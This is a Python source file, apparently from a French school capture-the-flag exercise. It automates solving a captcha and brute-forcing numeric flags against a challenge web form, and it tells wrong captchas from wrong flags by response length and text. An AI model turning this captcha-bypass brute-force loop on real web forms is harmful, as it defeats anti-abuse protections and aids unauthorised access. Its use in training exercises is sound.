import re

import requests

from src.tp3.utils.captcha import Captcha
from src.tp3.utils.config import logger

# Longueur de la réponse quand le captcha est invalide (serveur ignore la soumission)
_CAPTCHA_WRONG_LEN = 1226


class Session:
    """
    Class representing a session to solve a captcha and submit a flag.

    Attributes:
        url (str): The URL of the captcha.
        captcha_value (str): The value of the solved captcha.
        flag_value (str): The value of the flag to submit.
        valid_flag (str): The valid flag obtained after processing the response.
    """

    def __init__(self, url):
        """
        Initializes a new session with the given URL.

        Args:
            url (str): The URL of the captcha.
        """
        self.url = url
        self.captcha_value = ""
        self.flag_value = ""
        self.valid_flag = ""
        self._http_session = requests.Session()
        self._response = None
        self._current_flag, self._flag_max = self._get_flag_range()

    def prepare_request(self):
        """
        Prepares the request for sending by capturing and solving the captcha.
        The flag counter is NOT reset here — it persists across retries.
        """
        captcha = Captcha(self.url, self._http_session)
        captcha.capture()
        captcha.solve()

        self.captcha_value = captcha.get_value()
        self.flag_value = str(self._current_flag)

    def _get_flag_range(self):
        """Déduit la plage de flags depuis le numéro du challenge dans l'URL."""
        match = re.search(r"captcha(\d+)", self.url)
        if match:
            n = int(match.group(1))
            return n * 1000, (n + 1) * 1000
        return 1000, 2001

    def submit_request(self):
        """
        Soumet le flag courant avec le captcha résolu.
        Le captcha n'est valide que pour un seul POST, donc on tente un flag par appel.
        """
        data = {
            "flag": self.flag_value,
            "captcha": self.captcha_value,
            "submit": "Submit",
        }
        self._response = self._http_session.post(self.url, data=data)
        logger.info(
            f"Soumis flag={self.flag_value!r} captcha={self.captcha_value!r} "
            f"(len={len(self._response.text)})"
        )

    def process_response(self):
        """
        Traite la dernière réponse.
        - Captcha invalide (len <= seuil) → False, on re-solve le même flag
        - 'Incorrect flag' → False, on passe au flag suivant
        - Autre → True, flag trouvé
        """
        if self._response is None:
            return False

        text = self._response.text

        # Captcha invalide : le serveur a renvoyé la page sans aucun message
        if len(text) <= _CAPTCHA_WRONG_LEN:
            logger.info(
                f"Captcha incorrect (len={len(text)}), "
                f"nouvelle tentative pour flag={self._current_flag}..."
            )
            return False

        # Flag incorrect (captcha était bon) → passer au flag suivant
        if "Incorrect flag" in text:
            logger.info(f"flag={self._current_flag} incorrect, on passe au suivant")
            self._current_flag += 1
            self.flag_value = str(self._current_flag)
            return False

        # Succès : cherche un flag au format ESGI{...}
        match = re.search(r"ESGI\{[^}]+\}", text)
        if match:
            self.valid_flag = match.group(0)
            logger.info(f"Flag trouvé : {self.valid_flag}")
            return True

        # Message de succès générique avec flag dans une balise alert-success
        match = re.search(r'alert-success[^>]*>\s*([^<]+)<', text, re.IGNORECASE)
        if match:
            self.valid_flag = match.group(1).strip()
            logger.info(f"Flag trouvé : {self.valid_flag}")
            return True

        # Réponse différente de tous les cas d'échec connus
        logger.info(f"Réponse inattendue (len={len(text)}), nouvelle tentative...")
        return False

    def get_flag(self):
        """
        Returns the valid flag.

        Returns:
            str: The valid flag.
        """
        return self.valid_flag
